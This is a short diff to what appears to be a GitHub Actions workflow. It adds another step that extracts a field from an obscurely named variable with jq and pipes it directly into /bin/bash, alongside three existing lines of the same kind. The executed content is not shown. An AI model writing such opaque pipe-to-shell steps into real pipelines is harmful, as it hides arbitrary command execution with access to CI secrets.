@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$cei94770" | jq -r .eh67 | /bin/bash
           echo $c82 | jq -r .nvcp507 | /bin/bash
           printf '%s' "$ow9342" | jq -r .fi25 | /bin/bash
+          echo $yqpf183 | jq -r .u6795 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
